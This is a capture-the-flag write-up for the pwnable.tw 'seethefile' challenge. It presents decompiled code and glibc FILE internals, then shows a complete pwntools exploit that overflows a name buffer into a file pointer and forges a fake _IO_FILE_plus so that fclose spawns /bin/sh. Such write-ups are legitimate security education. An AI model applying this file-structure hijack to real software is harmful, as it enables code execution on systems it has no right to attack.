---
date: '2025-08-29T12:50:29+07:00'
draft: false
title: 'Seethefile (250 pts) - pwnable.tw'
tags: ["pwnable.tw"]
---
---

## 0x1. Initial Reconnaissance 

### file
```
↪ file seethefile
seethefile: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=04e6f2f8c85fca448d351ef752ff295581c2650d, not stripped
```

### checksec
```
↪ checksec --file=seethefile
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   95 Symbols	  No	0		3		seethefile
```

### ./seethefile
```
#######################################################
   This is a simple program to open,read,write a file
   You can open what you want to see
   Can you read everything ?
#######################################################
---------------MENU---------------
  1. Open
  2. Read
  3. Write to screen
  4. Close
  5. Exit
----------------------------------
Your choice :
```

---

## 0x2. Reverse Engineering

### main
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp-Ch] [ebp-44h]
  int v5; // [esp-Ch] [ebp-44h]
  int v6; // [esp-8h] [ebp-40h]
  int v7; // [esp-4h] [ebp-3Ch]
  char v8[32]; // [esp+Ch] [ebp-2Ch] BYREF
  unsigned int v9; // [esp+2Ch] [ebp-Ch]

  v9 = __readgsdword(0x14u);
  init();
  welcome();
  while ( 1 )
  {
    menu();
    __isoc99_scanf("%s", v8);
    switch ( atoi(v8) )
    {
      case 1:
        openfile();
        continue;
      case 2:
        readfile();
        continue;
      case 3:
        writefile();
        continue;
      case 4:
        closefile();
        continue;
      case 5:
        printf("Leave your name :");
        __isoc99_scanf("%s", name);
        printf("Thank you %s ,see you next time\n", name);
        if ( fp )
          fclose(fp);
        exit(0, v5, v6, v7);
        goto LABEL_10;
      default:
LABEL_10:
        puts("Invaild choice");
        exit(0, v4, v6, v7);
        break;
    }
  }
}
```

### openfile
```c
int openfile()
{
  int v1; // [esp-Ch] [ebp-14h]
  int v2; // [esp-8h] [ebp-10h]
  int v3; // [esp-4h] [ebp-Ch]

  if ( fp )
  {
    puts("You need to close the file first");
    return 0;
  }
  else
  {
    memset(&magicbuf, 0, 400);
    printf("What do you want to see :");
    __isoc99_scanf("%63s", &filename);
    if ( strstr(&filename, "flag") )
    {
      puts("Danger !");
      exit(0, v1, v2, v3);
    }
    fp = fopen(&filename, "r");
    if ( fp )
      return puts("Open Successful");
    else
      return puts("Open failed");
  }
}
```

### readfile
```c
int readfile()
{
  int result; // eax

  memset(&magicbuf, 0, 400);
  if ( !fp )
    return puts("You need to open a file first");
  result = fread(&magicbuf, 399, 1, fp);
  if ( result )
    return puts("Read Successful");
  return result;
}
```

### writefile
```c
int writefile()
{
  int v1; // [esp-Ch] [ebp-14h]
  int v2; // [esp-8h] [ebp-10h]
  int v3; // [esp-4h] [ebp-Ch]

  if ( strstr(&filename, "flag") || strstr(&magicbuf, "FLAG") || strchr(&magicbuf, 125) )
  {
    puts("you can't see it");
    exit(1, v1, v2, v3);
  }
  return puts(&magicbuf);
}
```

### closefile
```c
int closefile()
{
  int result; // eax

  if ( fp )
    result = fclose(fp);
  else
    result = puts("Nothing need to close");
  fp = 0;
  return result;
}
```

---
## 0x3. Analysis

We have 5 options, write a file name to filename variable in bss, open it and store the address of ```_IO_FILE_PLUS``` to fp variable in bss. 

##### libio.h
```c
struct _IO_FILE {
  int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */
#define _IO_file_flags _flags

  /* The following pointers correspond to the C++ streambuf protocol. */
  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
  char* _IO_read_ptr;	/* Current read pointer */
  char* _IO_read_end;	/* End of get area. */
  char* _IO_read_base;	/* Start of putback+get area. */
  char* _IO_write_base;	/* Start of put area. */
  char* _IO_write_ptr;	/* Current put pointer. */
  char* _IO_write_end;	/* End of put area. */
  char* _IO_buf_base;	/* Start of reserve area. */
  char* _IO_buf_end;	/* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;

  int _fileno;
#if 0
  int _blksize;
#else
  int _flags2;
#endif
  _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */

#define __HAVE_COLUMN /* temporary */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  /*  char* _save_gptr;  char* _save_egptr; */

  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};
```


##### libioP.h
```c
struct _IO_jump_t
{
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn);
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
#if 0
    get_column;
    set_column;
#endif
};

struct _IO_FILE_plus
{
  _IO_FILE file;
  const struct _IO_jump_t *vtable;
};
```

We can also read the file and store the content to magicbuf, print the content to the screen. You can use fread the second time to read the next 400 bytes. You can also close the file if you want.
The last option is exit, after that you can write whatever you want with your desire length to an array char name[32] just right above fp variable.

---
## 0x4. Exploit

You can open the file ```/proc/self/maps``` to leak the libc address. When exit the process, they call fclose too, before that you can overwrite fp variable, and create a fake ```_IO_FILE_PLUS``` too.
Let's see the fclose function in libc 2.23:

```c

int
attribute_compat_text_section
_IO_old_fclose (_IO_FILE *fp)
{
  int status;

  CHECK_FILE(fp, EOF);

  /* We desperately try to help programs which are using streams in a
     strange way and mix old and new functions.  Detect new streams
     here.  */
  if (fp->_vtable_offset == 0)
    return _IO_new_fclose (fp);

  /* First unlink the stream.  */
  if (fp->_IO_file_flags & _IO_IS_FILEBUF)
    _IO_un_link ((struct _IO_FILE_plus *) fp);

  _IO_acquire_lock (fp);
  if (fp->_IO_file_flags & _IO_IS_FILEBUF)
    status = _IO_old_file_close_it (fp);
  else
    status = fp->_flags & _IO_ERR_SEEN ? -1 : 0;
  _IO_release_lock (fp);
  _IO_FINISH (fp);
  if (_IO_have_backup (fp))
    _IO_free_backup_area (fp);
  if (fp != _IO_stdin && fp != _IO_stdout && fp != _IO_stderr)
    {
      fp->_IO_file_flags = 0;
      free(fp);
    }

  return status;
}
```

As you can see, in old fclose funtion ,with vtable_offset marked, they call ```_IO_FINISH```, which expands to ```((struct _IO_jump_t *)(fp->vtable))->__finish (fp)```. That means if you overwrite system address to __finish field in vtable, you can call ```system (fp)```.
Oke now, before you can reach ```_IO_FINISH (fp)```, they could call ```CHECK_FILE, _IO_un_link, _IO_old_file_close_it```. The last 2 functions are only called if ```_IO_IS_FILEBUF``` state is marked in ```fp->file._flags```, thus the easiest way to bypass is set these state unmarked. The first function only checks whether are some states marked ? To bypass, just need to set all bits to 1 except ```_IO_IS_FILEBUF```. 
Oh I forgot ```_IO_acquire_lock``` and ```_IO_release_lock```. As you can see above that they have ```_IO_lock_t *_lock;``` in ```_IO_FILE``` struct. This field is created to prevent race conditions when multiple threads access the same FILE stream. 
```c
typedef struct { 
     int lock; 
     int cnt; 
     void *owner;
} _IO_lock_t;
```
A FILE is lock if ```_lock->cnt != 0```, ```_IO_acquire_lock``` will increase it by 1 and ```_IO_release_lock``` decrease it by 1. If the FILE is locked before ```_IO_acquire_lock```, there would be segmentation fault. You can assign ```_lock``` field to an address with three null variables to bypass.

```
name -> 0xFFFFDFFF       - _flags
+4   -> ;/bi             - _IO_read_ptr
+8   -> n/sh             - _IO_read_end
+12  -> /x00AAA          - _IO_read_base
+16  -> AAAA             - _IO_write_base
....
fp   -> name addr        - _IO_buf_end
+4   -> AAAA             - _IO_save_base
....
+40  -> filename addr+36  - _lock  - _dummy (vtable)
+44  -> fp addr+40       - vtable - _dummy2 (vtable)
+48  -> system addr      - __finish (vtable)
```

##### Exploit
```py
from pwn import *

exe = ELF("./seethefile_patched")
libc = ELF("./libc_32.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe
context.log_level = "debug"

def conn():
    if args.LOCAL:
        r = process([exe.path])
        # r = gdb.debug ([exe.path], "b *main")
    else:
        r = remote("chall.pwnable.tw", 10200)

    return r

def open_file (p, name):
    p.sendlineafter (b'Your choice :', b'1')
    p.sendlineafter (b':', name)

def read_file (p):
    p.sendlineafter (b'Your choice :', b'2')

def write_file (p):
    p.sendlineafter (b'Your choice :', b'3')

def close_file (p):
    p.sendlineafter (b'Your choice :', b'4')

def exit_process (p, payload):
    p.sendlineafter (b'Your choice :', b'5')
    p.sendlineafter (b'Leave your name :', payload)

def main():
    p = conn()
    name = 0x0804B260
    fp = 0x0804b280
    filename = 0x0804B080
    open_file (p, b'/proc/self/maps')
    read_file (p)
    read_file (p)
    write_file (p)
    # p.recvuntil (b'0 rw-p 00000000 00:00 0 \n')
    p.recvuntil (b'[heap]\n')
    temp = p.recv (8).decode ('utf-8')
    libc.address = int (temp, 16)
    print ("The address of libc is: ", hex (libc.address))


    payload = p32 (0xFFFFDFFF) + b';/bin/sh\x00' + b'A' * 19 + p32 (name) + b'A' * 16 + b'\x00' + b'A' * 19 + p32 (filename + 20) + p32 (fp + 40) + p32 (libc.symbols['system'])
    exit_process (p, payload)

    p.interactive()


if __name__ == "__main__":
    main()
```